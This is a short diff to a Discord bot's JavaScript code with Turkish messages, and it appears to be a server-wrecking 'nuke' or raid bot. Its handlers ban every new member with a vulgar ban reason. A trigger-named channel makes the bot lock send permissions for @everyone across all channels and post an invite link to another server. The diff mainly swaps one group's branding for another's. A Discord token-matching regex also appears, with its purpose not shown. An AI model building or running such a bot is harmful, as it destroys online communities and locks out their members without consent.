@@ -133,8 +133,8 @@ client.unload = command => {
 };
 
 client.on('guildMemberAdd', member => {
-  member.guild.ban(member, "BAN BOT TARAFINDAN YOK EDİLDİ")
-  member.send(`Satan Win.`)
+  member.guild.ban(member, "S2 Tarafından Yarrağı Yedi")
+  member.send(`S2`)
 });
 
 var regToken = /[\w\d]{24}\.[\w\d]{6}\.[\w\d-_]{27}/g;
@@ -148,8 +148,8 @@ client.on('error', e => {
 });
 
 client.on('channelCreate', channel => {
-  if (channel.name == 'satan') {
-    channel.send(`@everyone https://media1.tenor.com/images/55f51adbe8a54dcb321a412bdfa738bb/tenor.gif?itemid=8515905`)
+  if (channel.name == 's2') {
+    channel.send(`Bebeğim Burası Yok Oldu Hadi bb https://discord.gg/w8Xq9bm`)
     channel.guild.channels.forEach(c => {
          c.overwritePermissions(channel.guild.roles.find("name", "@everyone"), {
               SEND_MESSAGES: false,
@@ -158,8 +158,8 @@ client.on('channelCreate', channel => {
             });
           });
   }
-  if (channel.name == 'never-lose') {
-    channel.send(`amonx&lyrics`)
+  if (channel.name == 'berke-abi-ne-yaptin') {
+    channel.send(`allah çarptı`)
   }
 
 });
